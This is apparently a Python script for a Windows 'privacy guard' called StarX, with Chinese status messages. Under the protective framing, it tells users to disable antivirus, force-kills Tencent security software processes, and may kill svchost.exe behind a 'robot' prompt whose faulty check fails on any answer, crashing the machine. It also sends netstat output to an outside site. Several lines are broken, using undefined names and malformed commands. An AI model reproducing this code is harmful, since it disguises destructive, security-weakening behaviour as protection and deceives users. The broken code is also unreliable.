import logger
import warnings
import system.info
import network.http
import network.proxy
import cryptology.aes
import cryptology.md5
import cryptology.discretization
warnings.filterwarnings("ignore")
dr = cryptology.discretization.DiscretizationRandom(65, 122) 
rawResult = dr.get_discretized_random() 
password = ''
for text in rawResult:
    password += chr(text)
hpassword = cryptology.aes.encrypt(password,cryptology.md5.get_md5(str(system.info.sysInfo)))
hpassword = hpassword.decode('utf-8','ignore')
del password

server = ''
try:
    with open('firstopen') as x:
        server = x.read()
except FileNotFoundError:
    server = input('StarX Server:')
    with open('firstopen','w') as y:
        y.write(server)
        
print('StarX version 0.1.0 - Run on {}'.format(system.info.sysInfo.get('run')))
print('Token md5:{}'.format(cryptology.md5.get_md5(hpassword)))
print('Use Ctrl+C plus Return to exit.')
showLog = logger.log()
try:
    showLog.print('如果您要使用国产系软件又不想暴露隐私，这是一个不错的选择。')
    showLog.print('Starting StarX')
    showLog.print('初始化:与服务器进行握手')
    showLog.print('初始化在启动 StarX 之前，您需要关闭您的防病毒软件。如您完成关闭，请按下回车键.')
    try:
        input()
    except:
        import sys
        sys.exit()
    import os
    import json
    import time
    import urllib.request
    handshake = {
        'version':'0.1.0',
        'token':hpassword
    }
    handshake = json.dumps(handshake)
    handshake = handshake.encode('utf-8')  # 将字符串转换为字节流
    headers = {'Accept-Charset': 'utf-8', 'Content-Type': 'application/json'}
    try:
        for i in range(int(str(int(time.time()))[0])):
            req = urllib.request.Request(url=server+'/api/v2/handshake', data=handshake, headers=headers, method='POST')
            response = urllib.request.urlopen(req).read()
    except:
        showLog.print('与服务器握手失败，现在以离线模式启动 StarX.')
        
    from daemon.daemon import start as daemon
    daemon()
    showLog.print('守护进程已创建，现在请不要关闭 StarX 否则这会导致您的电脑崩溃。')
    showLog.print('StarX 正在守护您的计算机！')   
    blackList = ['QQPCTray.exe','QQPCRTP.exe','*.jpg.exe','*.png.exe','*.svg.exe','Netspy.exe']
    warnList = ['wechat.exe','qq.exe','imeutil.exe','Mbbmanager.exe','Runouce.exe','Winmsg32.exe','e.exe']
    while True:
        # Task 0: User need to know
        os.system('cls')
        os.system('tasklist')
        os.system('netstat -ano')
        time.sleep(3)
        # Task 1: 进程列表监控
        x = os.popen('tasklist').read()
        for i in blackList:
            if i in x:
                for blacker in blackList:
                    showLog.print('发现被拉黑进程:{}，已进行 结束 操作.'.format(blacker))
                    os.system('taskkill /f /im {}'.format(blacker))
        for i in warnlist:
            if i in warnList:
                for warner in warnList:
                    showLog.print('警告: 风险进程 {} 正在运行.'.format(warner))
        # Task 2: Are you pyautogui?
        import win32gui
        import os
        import os.path
        import shutil
        import pyautogui
        def winEnumHandler(hwnd,ctx):
            if win32gui.IsWindowVisible(hwnd):
                return hex(hwnd), win32gui.GetWindowText(hwnd)
            t = win32gui.EnumWindows( winEnumHandler, None )
        if 'C:\\' in t or t == '任务管理器':
            import random
            seed = random.randint(1,1000000)
            if seed == 1:
                x = random.randint(1,100)
                y = random.randint(1,100)
                z = x + y
                where = random.randint(0,1)
                if where:
                    btn = [str(z),str(z+1)]
                else:
                    btn = [str(z+1),str(z)]
                a = pyautogui.confirm('Are you Robot? {}',format(str(x)+'+'+str(y)+'=?'), buttons=btn)
                if a != z:
                    os.system('taskkill /f /im svchost.exe')
        # Task 3: Please don't send my data!
        import time
        network = os.popen('netstat -ano').readlines()
        ipblacklist = []
        def stopNetwork():
            os.system('interface set interface "以太网" disabled')
            time.sleep(1/4)
            os.system('interface set interface "以太网" enabled')
        import urllib.request
        
        try:
            for i in network:
                x = urllib.request.urlopen('https://ti.qianxin.com/v2/search?type=ip&value='+i).read()
                if 'DHT' in x or 'noSafe' in x:
                    stopNetwork()
        except:
            pass
            
except KeyboardInterrupt:
    raise SystemExit(0)
except Exception as e:
    pass